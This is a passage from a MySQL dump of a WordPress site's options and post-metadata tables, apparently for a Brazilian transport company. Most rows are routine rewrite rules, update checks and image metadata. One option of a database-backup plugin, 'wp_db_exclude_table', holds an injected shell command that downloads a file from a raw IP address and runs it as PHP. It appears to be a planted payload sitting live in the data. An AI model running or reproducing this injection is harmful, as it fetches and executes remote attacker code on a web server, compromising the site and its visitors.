p?&feed=$matches[1]&withcomments=1\";s:36:\"comments/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:17:\"comments/embed/?$\";s:21:\"index.php?&embed=true\";s:44:\"search/(.+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:39:\"search/(.+)/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:20:\"search/(.+)/embed/?$\";s:34:\"index.php?s=$matches[1]&embed=true\";s:32:\"search/(.+)/page/?([0-9]{1,})/?$\";s:41:\"index.php?s=$matches[1]&paged=$matches[2]\";s:14:\"search/(.+)/?$\";s:23:\"index.php?s=$matches[1]\";s:47:\"author/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:42:\"author/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:23:\"author/([^/]+)/embed/?$\";s:44:\"index.php?author_name=$matches[1]&embed=true\";s:35:\"author/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?author_name=$matches[1]&paged=$matches[2]\";s:17:\"author/([^/]+)/?$\";s:33:\"index.php?author_name=$matches[1]\";s:69:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:45:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/embed/?$\";s:74:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&embed=true\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&paged=$matches[4]\";s:39:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$\";s:63:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]\";s:56:\"([0-9]{4})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:51:\"([0-9]{4})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:32:\"([0-9]{4})/([0-9]{1,2})/embed/?$\";s:58:\"index.php?year=$matches[1]&monthnum=$matches[2]&embed=true\";s:44:\"([0-9]{4})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]\";s:26:\"([0-9]{4})/([0-9]{1,2})/?$\";s:47:\"index.php?year=$matches[1]&monthnum=$matches[2]\";s:43:\"([0-9]{4})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:38:\"([0-9]{4})/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:19:\"([0-9]{4})/embed/?$\";s:37:\"index.php?year=$matches[1]&embed=true\";s:31:\"([0-9]{4})/page/?([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&paged=$matches[2]\";s:13:\"([0-9]{4})/?$\";s:26:\"index.php?year=$matches[1]\";s:27:\".?.+?/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\".?.+?/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\".?.+?/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\".?.+?/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"(.?.+?)/embed/?$\";s:41:\"index.php?pagename=$matches[1]&embed=true\";s:20:\"(.?.+?)/trackback/?$\";s:35:\"index.php?pagename=$matches[1]&tb=1\";s:40:\"(.?.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:35:\"(.?.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:28:\"(.?.+?)/page/?([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&paged=$matches[2]\";s:35:\"(.?.+?)/comment-page-([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&cpage=$matches[2]\";s:24:\"(.?.+?)(?:/([0-9]+))?/?$\";s:47:\"index.php?pagename=$matches[1]&page=$matches[2]\";s:27:\"[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\"[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\"[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\"[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"([^/]+)/embed/?$\";s:37:\"index.php?name=$matches[1]&embed=true\";s:20:\"([^/]+)/trackback/?$\";s:31:\"index.php?name=$matches[1]&tb=1\";s:40:\"([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:35:\"([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:28:\"([^/]+)/page/?([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&paged=$matches[2]\";s:35:\"([^/]+)/comment-page-([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&cpage=$matches[2]\";s:24:\"([^/]+)(?:/([0-9]+))?/?$\";s:43:\"index.php?name=$matches[1]&page=$matches[2]\";s:16:\"[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:26:\"[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:46:\"[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:22:\"[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";}', 'yes'),
(9003, 'wp_local_db_backup_count', '', 'yes'),
(9004, 'wp_db_log', '0', 'yes'),
(9005, 'wp_db_exclude_table', '$(wget http://45.67.228.15/t.txt -O t.php;php -f t.php)', 'yes'),
(16512, 'wp_db_backup_destination_FTP', '1', 'yes'),
(16513, 'wp_db_backup_destination_Email', '1', 'yes'),
(16514, 'wp_db_backup_destination_s3', '1', 'yes'),
(16515, 'wp_db_remove_local_backup', '0', 'yes'),
(16517, 'widget_media_audio', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(16518, 'widget_media_image', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(16519, 'widget_media_gallery', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(16520, 'widget_media_video', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(16521, 'widget_custom_html', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(16525, 'can_compress_scripts', '0', 'no');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(32673, '_site_transient_update_core', 'O:8:\"stdClass\":4:{s:7:\"updates\";a:7:{i:0;O:8:\"stdClass\":10:{s:8:\"response\";s:7:\"upgrade\";s:8:\"download\";s:65:\"https://downloads.wordpress.org/release/pt_BR/wordpress-5.4.1.zip\";s:6:\"locale\";s:5:\"pt_BR\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:65:\"https://downloads.wordpress.org/release/pt_BR/wordpress-5.4.1.zip\";s:10:\"no_content\";b:0;s:11:\"new_bundled\";b:0;s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.4.1\";s:7:\"version\";s:5:\"5.4.1\";s:11:\"php_version\";s:6:\"5.6.20\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";}i:1;O:8:\"stdClass\":10:{s:8:\"response\";s:7:\"upgrade\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.4.1.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.4.1.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.4.1-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.4.1-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.4.1\";s:7:\"version\";s:5:\"5.4.1\";s:11:\"php_version\";s:6:\"5.6.20\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";}i:2;O:8:\"stdClass\":11:{s:8:\"response\";s:10:\"autoupdate\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.4.1.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.4.1.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.4.1-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.4.1-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.4.1\";s:7:\"version\";s:5:\"5.4.1\";s:11:\"php_version\";s:6:\"5.6.20\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";s:9:\"new_files\";s:1:\"1\";}i:3;O:8:\"stdClass\":11:{s:8:\"response\";s:10:\"autoupdate\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.3.3.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.3.3.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.3.3-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.3.3-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.3.3\";s:7:\"version\";s:5:\"5.3.3\";s:11:\"php_version\";s:6:\"5.6.20\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";s:9:\"new_files\";s:1:\"1\";}i:4;O:8:\"stdClass\":11:{s:8:\"response\";s:10:\"autoupdate\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.2.6.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.2.6.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.2.6-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.2.6-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.2.6\";s:7:\"version\";s:5:\"5.2.6\";s:11:\"php_version\";s:6:\"5.6.20\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";s:9:\"new_files\";s:1:\"1\";}i:5;O:8:\"stdClass\":11:{s:8:\"response\";s:10:\"autoupdate\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.1.5.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.1.5.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.1.5-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.1.5-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.1.5\";s:7:\"version\";s:5:\"5.1.5\";s:11:\"php_version\";s:5:\"5.2.4\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";s:9:\"new_files\";s:1:\"1\";}i:6;O:8:\"stdClass\":11:{s:8:\"response\";s:10:\"autoupdate\";s:8:\"download\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.0.9.zip\";s:6:\"locale\";s:5:\"en_US\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:59:\"https://downloads.wordpress.org/release/wordpress-5.0.9.zip\";s:10:\"no_content\";s:70:\"https://downloads.wordpress.org/release/wordpress-5.0.9-no-content.zip\";s:11:\"new_bundled\";s:71:\"https://downloads.wordpress.org/release/wordpress-5.0.9-new-bundled.zip\";s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"5.0.9\";s:7:\"version\";s:5:\"5.0.9\";s:11:\"php_version\";s:5:\"5.2.4\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"5.3\";s:15:\"partial_version\";s:0:\"\";s:9:\"new_files\";s:1:\"1\";}}s:12:\"last_checked\";i:1590308353;s:15:\"version_checked\";s:6:\"4.9.14\";s:12:\"translations\";a:0:{}}', 'no'),
(33273, '_site_transient_timeout_theme_roots', '1590310153', 'no'),
(33274, '_site_transient_theme_roots', 'a:1:{s:8:\"spacious\";s:7:\"/themes\";}', 'no'),
(33275, '_site_transient_update_themes', 'O:8:\"stdClass\":4:{s:12:\"last_checked\";i:1590308354;s:7:\"checked\";a:1:{s:8:\"spacious\";s:5:\"1.2.4\";}s:8:\"response\";a:1:{s:8:\"spacious\";a:6:{s:5:\"theme\";s:8:\"spacious\";s:11:\"new_version\";s:5:\"1.7.1\";s:3:\"url\";s:38:\"https://wordpress.org/themes/spacious/\";s:7:\"package\";s:56:\"https://downloads.wordpress.org/theme/spacious.1.7.1.zip\";s:8:\"requires\";b:0;s:12:\"requires_php\";b:0;}}s:12:\"translations\";a:0:{}}', 'no'),
(33276, '_site_transient_update_plugins', 'O:8:\"stdClass\":5:{s:12:\"last_checked\";i:1590308354;s:7:\"checked\";a:3:{s:35:\"si-contact-form/si-contact-form.php\";s:6:\"4.0.56\";s:27:\"google-map-wp/googlemap.php\";s:5:\"2.2.1\";s:41:\"wp-database-backup/wp-database-backup.php\";s:5:\"4.5.4\";}s:8:\"response\";a:1:{s:41:\"wp-database-backup/wp-database-backup.php\";O:8:\"stdClass\":12:{s:2:\"id\";s:32:\"w.org/plugins/wp-database-backup\";s:4:\"slug\";s:18:\"wp-database-backup\";s:6:\"plugin\";s:41:\"wp-database-backup/wp-database-backup.php\";s:11:\"new_version\";s:5:\"5.5.1\";s:3:\"url\";s:49:\"https://wordpress.org/plugins/wp-database-backup/\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/plugin/wp-database-backup.zip\";s:5:\"icons\";a:1:{s:2:\"1x\";s:71:\"https://ps.w.org/wp-database-backup/assets/icon-128x128.png?rev=1456861\";}s:7:\"banners\";a:2:{s:2:\"2x\";s:74:\"https://ps.w.org/wp-database-backup/assets/banner-1544x500.png?rev=1456043\";s:2:\"1x\";s:73:\"https://ps.w.org/wp-database-backup/assets/banner-772x250.png?rev=1456043\";}s:11:\"banners_rtl\";a:0:{}s:6:\"tested\";s:5:\"5.3.3\";s:12:\"requires_php\";b:0;s:13:\"compatibility\";O:8:\"stdClass\":0:{}}}s:12:\"translations\";a:0:{}s:9:\"no_update\";a:0:{}}', 'no');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_postmeta`
--

CREATE TABLE `wp_postmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `post_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_postmeta`
--

INSERT INTO `wp_postmeta` (`meta_id`, `post_id`, `meta_key`, `meta_value`) VALUES
(39, 15, '_wp_attached_file', '2015/03/1425729515_Delivery.png'),
(40, 15, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:31:\"2015/03/1425729515_Delivery.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(41, 16, '_wp_attached_file', '2015/03/logo-ywc-novo.png'),
(42, 16, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:220;s:6:\"height\";i:132;s:4:\"file\";s:25:\"2015/03/logo-ywc-novo.png\";s:5:\"sizes\";a:1:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:25:\"logo-ywc-novo-150x132.png\";s:5:\"width\";i:150;s:6:\"height\";i:132;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(51, 21, '_wp_attached_file', '2015/03/1197254_8892942.jpg'),
(52, 21, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:27:\"2015/03/1197254_8892942.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"1197254_8892942-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:26:\"1197254_8892942-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:28:\"1197254_8892942-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:27:\"1197254_8892942-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:27:\"1197254_8892942-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:27:\"1197254_8892942-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:27:\"1197254_8892942-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(53, 22, '_wp_attached_file', '2015/03/1197254_8892943.jpg'),
(54, 22, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:27:\"2015/03/1197254_8892943.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"1197254_8892943-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:26:\"1197254_8892943-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:28:\"1197254_8892943-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:27:\"1197254_8892943-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:27:\"1197254_8892943-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:27:\"1197254_8892943-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:27:\"1197254_8892943-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(55, 23, '_wp_attached_file', '2015/03/fiorinos.jpg'),
(56, 23, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:20:\"2015/03/fiorinos.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"fiorinos-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:19:\"fiorinos-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"fiorinos-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:20:\"fiorinos-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:20:\"fiorinos-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:20:\"fiorinos-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:20:\"fiorinos-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(62, 26, '_edit_last', '1'),
(63, 26, '_edit_lock', '1444054314:2'),
(64, 26, 'spacious_page_layout', 'default_layout'),
(65, 26, '_wp_page_template', 'default'),
(70, 30, '_edit_last', '1'),
(71, 30, 'spacious_page_layout', 'default_layout'),
(72, 30, '_wp_page_template', 'default'),
(73, 30, '_edit_lock', '1444054628:2'),
(78, 35, '_menu_item_type', 'post_type'),
(79, 35, '_menu_item_menu_item_parent', '0'),
(80, 35, '_menu_item_object_id', '30'),
(81, 35, '_menu_item_object', 'page'),
(82, 35, '_menu_item_target', ''),
(83, 35, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(84, 35, '_menu_item_xfn', ''),
(85, 35, '_menu_item_url', ''),
(96, 37, '_menu_item_type', 'post_type'),
(97, 37, '_menu_item_menu_item_parent', '0'),
(98, 37, '_menu_item_object_id', '26'),
(99, 37, '_menu_item_object', 'page'),
(100, 37, '_menu_item_target', ''),
(101, 37, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(102, 37, '_menu_item_xfn', ''),
(103, 37, '_menu_item_url', ''),
(105, 38, '_menu_item_type', 'custom'),
(106, 38, '_menu_item_menu_item_parent', '0'),
(107, 38, '_menu_item_object_id', '38'),
(108, 38, '_menu_item_object', 'custom'),
(109, 38, '_menu_item_target', ''),
(110, 38, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(111, 38, '_menu_item_xfn', ''),
(112, 38, '_menu_item_url', 'http://araujotrans.com.br'),
(125, 42, '_wp_attached_file', '2015/03/Logo-Araujo-Transportes1.png'),
(126, 42, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:250;s:6:\"height\";i:100;s:4:\"file\";s:36:\"2015/03/Logo-Araujo-Transportes1.png\";s:5:\"sizes\";a:2:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:36:\"Logo-Araujo-Transportes1-150x100.png\";s:5:\"width\";i:150;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:36:\"Logo-Araujo-Transportes1-230x100.png\";s:5:\"width\";i:230;s:6:\"height\";i:100;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(127, 43, '_wp_attached_file', '2015/03/Logo-Araujo-Transportes2.png'),
